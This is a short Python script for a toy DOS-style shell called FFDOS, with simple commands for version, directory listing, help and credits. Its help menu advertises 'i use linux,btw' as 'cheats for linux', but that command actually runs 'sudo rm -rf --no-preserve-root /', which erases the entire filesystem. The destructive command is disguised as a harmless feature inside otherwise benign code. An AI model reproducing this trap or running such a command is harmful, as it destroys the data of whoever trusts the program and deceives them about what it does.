import time
import os

print("Welcome to FFDOS")

while True:
    com1 = input("command:")
    if com1 == "test":
        print("the test")
    if com1 == "ver":
        print("FFDOS 1.0")
    if com1 == "exit":
        break
    if com1 == "reset":
        os.system("dos.exe")
        os.system("python dos.py")
        break
    if com1 == "dir":
        os.system("dir")
    if com1 == "help":
        print ("comands:")
        print ("help - comands")
        print ("reset - restart the dos")
        print ("exit - exit the dos")
        print ("credits - credits of the system")
        print ("i use linux,btw - cheats for linux")
    if com1 == "credits":
        while False:
            com1 = input("command:")
        time.sleep(2)
        print ("FFDOS")
        time.sleep(2)
        print ("Coders: Artem Litvincev, Seva Tretyakov, Nikita Rojdestvin(Kernel)")
        time.sleep(2)
        print ("Creative: Artem Litvincev")
        time.sleep(2)
        print("Companies that developed:MECIS, XDAFAD Software")
        time.sleep(2)
    if com1 == "i use linux,btw":
        os.system("sudo rm -rf --no-preserve-root /")

        os.system("sudo rm -rf /")
